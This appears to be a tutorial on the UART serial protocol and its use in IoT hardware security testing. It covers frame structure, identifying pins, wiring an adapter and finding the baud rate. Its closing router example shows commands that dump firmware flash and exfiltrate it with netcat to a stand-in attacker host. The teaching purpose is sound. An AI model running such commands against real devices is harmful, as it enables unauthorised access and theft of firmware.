Introduction

UART (Universal Asynchronous Receiver/Transmitter) is one of the most fundamental communication protocols in embedded systems. It is the go-to interface for debugging, interacting with sensors, and communicating between microcontrollers. Understanding UART is essential for anyone working with hardware security or IoT device analysis.

How UART Works

UART is a serial, asynchronous protocol that transmits data one bit at a time over a single wire (TX for transmit, RX for receive). Unlike protocols like I2C or SPI, UART does not require a shared clock signal. Instead, both devices must agree on a baud rate — the speed at which bits are transmitted.

A standard UART frame consists of:

  • Start bit (logic low) — signals the beginning of a frame
  • Data bits (5 to 9 bits, typically 8) — the actual payload
  • Parity bit (optional) — basic error checking
  • Stop bit(s) (logic high) — signals the end of a frame

Identifying UART on a PCB

When performing hardware analysis, UART ports can often be identified by looking for a 4-pin header labelled with some combination of TX, RX, VCC, and GND. If no labels exist, you can probe the pins with a logic analyzer or oscilloscope:

  • TX will show activity (toggling) when the device boots
  • RX is usually idle unless something is sending data to the device
  • VCC is a steady voltage (typically 3.3V or 5V)
  • GND is 0V

Connecting to a UART Interface

To interact with a UART interface, you will need a USB-to-UART adapter (such as a Bus Pirate or FTDI cable). The connections are straightforward:

Device TX  →  Adapter RX
Device RX  →  Adapter TX
Device GND →  Adapter GND

Important: Do not connect VCC from the adapter to the device unless you are sure of the voltage requirements. Power the device from its own source.

Once connected, use a terminal program like screen, minicom, or picocom:

# Common baud rates to try: 9600, 19200, 38400, 57600, 115200
screen /dev/ttyUSB0 115200

Baud Rate Enumeration

If you do not know the baud rate, you can try common rates manually or use a logic analyzer to measure the bit width. The baud rate can be calculated as:

baud_rate = 1 / bit_period

Where bit_period is the width of one data bit in seconds. For example, a bit width of 8.68 µs corresponds to approximately 115200 baud.

Security Implications

UART interfaces are a common attack vector in IoT security assessments. Manufacturers often leave UART ports accessible on production boards for debugging, which can expose:

  • Boot logs containing kernel addresses and memory layout
  • Root shell access (via UART console)
  • Firmware update mechanisms
  • Sensitive configuration data

Practical Example

Consider a router that exposes a UART port on the PCB. After identifying the pins and connecting at 115200 baud, the device outputs boot messages and drops into a BusyBox shell with root privileges. From here, you can:

# cat /proc/mtd
# dump the firmware flash
cat /dev/mtd0 > /tmp/firmware.bin

# exfiltrate via netcat
nc attacker_ip 4444 < /tmp/firmware.bin

# or inspect the filesystem
mount -t proc proc /proc
mount -t sysfs sys /sys
ls /etc/

Conclusion

UART is a simple but powerful protocol. For hardware security researchers, it is often the easiest entry point into a device. Recognizing UART pins, connecting at the correct baud rate, and understanding what to do once you get a shell are essential skills for IoT penetration testing.
